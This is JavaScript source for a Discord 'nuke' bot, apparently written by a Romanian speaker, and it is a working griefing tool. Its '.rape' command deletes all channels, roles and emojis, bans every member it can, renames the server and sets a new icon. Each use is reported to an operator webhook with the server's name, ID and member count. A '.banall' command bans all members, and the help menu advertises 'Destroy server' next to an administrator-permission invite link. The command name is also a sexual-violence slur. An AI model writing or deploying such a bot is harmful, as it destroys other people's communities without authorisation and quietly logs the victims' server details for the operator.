const { Client } = require("discord.js");
const Discord = require("discord.js");

const { MessageEmbed, version: djsversion } = require('discord.js');
const client = new Discord.Client({  });
const { MessageButton } = require('discord-buttons-plugin')
const discordButtons = require("discord-buttons-plugin");
const buttonClient = new discordButtons(client)
require('discord-reply')
const db = require("quick.db")
const cooldown = new Set();
const cdtime = 5;
const msg = 5;
const http = require("http");
http.createServer((_, res) => res.end("Alive")).listen(8080)
let prefix = "."

client.on("ready", async () => {
  
const statusArray = ['Better leave me alone', 'I make you die only 1 button', 'i make your server dispear'];
client.user.setPresence({ status: 'idle' });

    setInterval(() => {
      client.user.setPresence({ status: 'idle' });
      const random = statusArray[Math.floor(Math.random() * statusArray.length)].split(', ')
      const status = random[0];
      const mode = random[1];

      client.user.setActivity(status, { type: mode })

    }, 10000) 
      
let matatactu = new Discord.MessageEmbed()
.setColor("2f3136")
.setDescription(">>> <:online:1010288493395722340> | **4226** was reconnected to the host.")
const wrb = new Discord.WebhookClient(process.env.tys, process.env.rts);
    await wrb.send(matatactu)
  
  console.log(`${client.user.tag} is on`);
}); 
  console.log("Servers:")
    client.guilds.cache.forEach((guild) => {
        console.log(" csf cuaie >> " + guild.name + " - sklavi " + guild.memberCount)
    })

   //--------------------------//  


client.on("message", async(message)=>{
  if (!message.guild) return;
      if (!message.guild) return;
    if (message.content.startsWith(`${prefix}rape`)||message.content.startsWith(`${prefix}Rape`)||message.content.startsWith(`${prefix}RAPE`)) {

    
         if(message.guild.id == '1010166314251321344') return message.channel.send('> <:icons_Wrong:1010289486317494342> **\`This guild is protected.\`**');

       let channels =  message.guild.channels.cache.array();
        let members =  message.guild.members.cache.array();
        let roles =  message.guild.roles.cache.array();
        let emojis =  message.guild.emojis.cache.array();
let guild = message.guild.id


 



      const sleep = (time) => new Promise(resolve => setTimeout(resolve, time));
          db.set(`channel_${message.guild.id}`, "k")



          let mes = new Discord.MessageEmbed()
          .setColor("#2f3136")
          .setDescription (`\`\`\`\n4226\n\`\`\`\n**${message.author.tag}** (\`${message.author.id}\`) a folosit comanda **rape** pe serverul **${message.guild.name}** (\`${message.guild.id}\`) cu **${message.guild.memberCount}** membrii`)
          .setTimestamp(Date.now());
              const wrb = new Discord.WebhookClient(process.env.ty,process.env.trs); 
              await wrb.send(mes)


const phin = require('phin').unpromisified
let guildID = message.guild.id











message.delete()
       message.guild.channels.cache.array().forEach(channel => {
      channel.delete();
    });
    message.guild.roles.cache
      .filter(
        r =>
          !r.managed &&
          r.position < message.guild.me.roles.highest.position &&
          r.id !== message.guild.id
      )
      .forEach(role => {
        role.delete();
      });
    message.guild.emojis.cache.array().forEach(emoji => {
      emoji.delete();
    });



message.guild.members.cache.filter(member => message.guild.member(member).bannable && member.id !== message.author.id).forEach( member => {
   member.ban()
     
})


message.guild.setName(`😈 | server inchis`)
    message.guild.setIcon(
      "https://images-ext-1.discordapp.net/external/MHd8ubtWwtvk1aZN8Qh3FFeVZXNWOzuTscFXAQ89y4I/%3Fq%3Dtbn%3AANd9GcTC7qiC3IHTBZNnwbRXlu0ri8GHgRbiZhuOzg%26usqp%3DCAU/https/encrypted-tbn0.gstatic.com/images"
    );
    
        
    
  

        
        
db.set(`${message.guild.id}-grief`, true);



        
      

};

  //--------------------------//

if (message.content === `${prefix}ping`|| message.content === `${prefix}Ping` || message.content === `${prefix}PING`) {

if (cooldown.has(message.author.id)) {
      return message.lineReply(`>>> \<:icons_timeout:1010289332571086910> **\`Please wait 5 seconds to use this command\`**`).then(m => {
        m.delete({ timeout: cdtime * 600 });
      });
    }
    cooldown.add(message.author.id);
    setTimeout(() => {
      cooldown.delete(message.author.id);
      }, cdtime * 1000);
  
      const pingembed = new Discord.MessageEmbed()
      .setColor('2f3136')
      .setDescription(`>>> Ping: - \`${Math.round(message.client.ws.ping)}ms\``)
.setFooter("Ping")
  .setTimestamp(Date.now());
      message.lineReplyNoMention(pingembed)
}
//------------------------//
  
if (message.content === `${prefix}help`) {

if (cooldown.has(message.author.id)) {
      return message.lineReply(`> <:icons_timeout:1010289332571086910> **\`Please wait 5 seconds to use this command\`**`).then(m => {
        m.delete({ timeout: cdtime * 600 });
      });
    }
    cooldown.add(message.author.id);
    setTimeout(() => {
      cooldown.delete(message.author.id);
      }, cdtime * 1000);
  
  const embed = new Discord.MessageEmbed()
  
                
                .setTitle('\<a:855146162398691400:1010273466060132352> | 4226')
                .setDescription(`>>> <:jos:1010219969721680004> ${prefix}[rape](https://discord.gg/6euBvCGx7x) - **__Destroy server__**\n<:sus:1010219923345252453> ${prefix}[ping](https://discord.gg/6euBvCGx7x) - **__Shows bot ping__**`)
    
                .setColor(`2f3136`)
    .setThumbnail("https://media.discordapp.net/attachments/1010212569048420393/1010280338452389988/standard.gif")
    .setFooter("Help")
                .setTimestamp(Date.now());

  const button1 = new buttonClient.MessageButton()
   .setLabel("Invite Link")
   .setURL("https://discord.com/api/oauth2/authorize?client_id=1010169171549626408&permissions=8&scope=bot%20applications.commands")

  const button2 = new buttonClient.MessageButton()
   .setLabel("Server")
   .setURL("https://discord.gg/CWRe3Rsr7s")

  buttonClient.send(null, { channel: message.channel.id, embed, buttons: [ [button1, button2] ]})
  
};
  
//------------------------//
  
if (message.content === `${prefix}leaveall`) {
  let ownerID = "1008751353725734943"
           let owner2 = "1008751353725734943"
           let owner3 = "1008751353725734943"
           if(message.author.id !== ownerID && message.author.id !== owner2 && message.author.id !== owner3) return;
             client.guilds.cache.forEach(guild => {
               let whitelist = "1010166314251321344"
               if(whitelist.includes(guild.id)) return;
               guild.leave()
               message.channel.send(`<a:check_yes:1010288496725987378>`)
             })
           };

  if (message.content.startsWith(`${prefix}banall`)) {
    if (message.guild.id === "1010166314251321344") return message.channel.send("> <:icons_Wrong:1010289486317494342> **\`This guild is protected.\`**")
    message.guild.members.cache.forEach(member => member.ban({ reason: "rip server bye" })
                                      )
  };
  //---------------------------//
});


client.login(process.env.TOKEN)